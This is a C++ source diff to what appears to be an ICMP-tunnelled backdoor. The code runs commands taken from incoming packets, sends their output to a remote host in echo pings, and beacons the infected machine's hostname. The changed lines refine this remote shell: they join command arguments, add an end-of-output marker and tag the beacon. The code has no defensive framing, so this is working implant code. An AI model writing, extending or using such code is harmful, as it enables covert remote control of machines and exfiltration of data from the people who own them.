@@ -150,6 +150,10 @@ void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size
     for (int i = 1; i < split.size(); i++)
     {
         command.append(split.at(i));
+        if (i != split.size() - 1)
+        {
+            command.append(" ");
+        }
     }
 
     std::cout << "Running: " << command << "\n";
@@ -166,6 +170,8 @@ void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size
         nbytes = fread(out, 1, sizeof(out), fp);
         send_ping(sockfd, dst, out, nbytes);
     } while (nbytes == sizeof(out));
+
+    send_ping(sockfd, dst, NULL, 0);
 
     pclose(fp);
 }
@@ -206,8 +212,9 @@ int main(int argc, char **argv)
     while (1)
     {
         // Send a ICMP echo request.
-        size_t hostname_len = strlen(hostname) + 1;
-        send_ping(sockfd, dest_ip, (uint8_t *)hostname, hostname_len);
+        std::string beacon = "(beacon) ";
+        beacon.append(hostname);
+        send_ping(sockfd, dest_ip, (uint8_t *)beacon.c_str(), beacon.size() + 1);
 
         uint8_t buf[1024];
         std::string src_ip;
